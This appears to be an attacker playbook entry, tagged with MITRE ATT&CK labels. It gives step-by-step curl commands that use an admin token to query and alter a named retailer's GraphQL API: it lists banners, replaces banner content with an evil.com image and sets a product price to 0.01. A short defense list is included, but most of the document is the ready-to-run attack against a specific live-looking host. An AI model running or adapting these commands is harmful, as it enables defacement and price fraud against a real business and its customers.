---
tags:
  - graphql
  - data-modification
  - e-commerce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/graphql-modify-banner]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:59.688Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 603d8763-c2e6-4d79-a62a-7893b4ae0724
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Access-and-Modify-Privileged-Features

## Summary

This procedure leverages admin privileges to query and mutate sensitive GraphQL endpoints, such as updating e-commerce banners and promotional products.

## Description

Post-escalation, the admin token unlocks mutations for internal features on https://tng-api.watsons.com.my, allowing changes to front-end content like banner images, product prices, and promotions. This can disrupt business operations or enable further attacks like defacement.

## Requirements

1. Admin authentication token
2. Schema knowledge of privileged mutations (e.g., updateBanner)
3. HTTP client for authenticated requests

## Defense

Defensive measures and detection strategies:

- Enforce least privilege on API mutations
- Implement change approval workflows for content updates
- Log all admin actions with anomaly detection

## Objectives

1. Access restricted API features
2. Modify e-commerce content
3. Demonstrate full compromise impact

## Instructions

### Step 1: Query Privileged Data

**Context**: Fetch sensitive data like current banners.

**Command** ([[commands/graphql-modify-banner]]):
```bash
curl -X POST https://tng-api.watsons.com.my/graphql -H "Content-Type: application/json" -H "Authorization: Bearer ADMIN_TOKEN" -d '{"query": "{ banners { id content imageUrl } }"}'
```

> Returns list of banners for targeting.

### Step 2: Modify Banner Content

**Context**: Update a banner to alter the e-commerce front page.

**Command** ([[commands/graphql-modify-banner]]):
```bash
curl -X POST https://tng-api.watsons.com.my/graphql -H "Content-Type: application/json" -H "Authorization: Bearer ADMIN_TOKEN" -d '{"query": "mutation { updateBanner(input: {id: \"1\", content: \"Modified Banner Content\", imageUrl: \"http://evil.com/image.jpg\"}) { banner { id content } } }"}'
```

> Confirms update; changes visible on site.

### Step 3: Alter Product Promotions

**Context**: Modify product details like prices.

**Command** ([[commands/graphql-modify-banner]]):
```bash
curl -X POST https://tng-api.watsons.com.my/graphql -H "Content-Type: application/json" -H "Authorization: Bearer ADMIN_TOKEN" -d '{"query": "mutation { updateProduct(input: {id: \"prod1\", price: 0.01, imageUrl: \"http://evil.com/fake.jpg\"}) { product { id price } } }"}'
```

> Updates applied to promotions.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques

- None

## Commands Used

- [[commands/graphql-modify-banner]]

## Tools Used

- None

## Tags

- [[graphql]]
- [[data-modification]]
- [[e-commerce]]
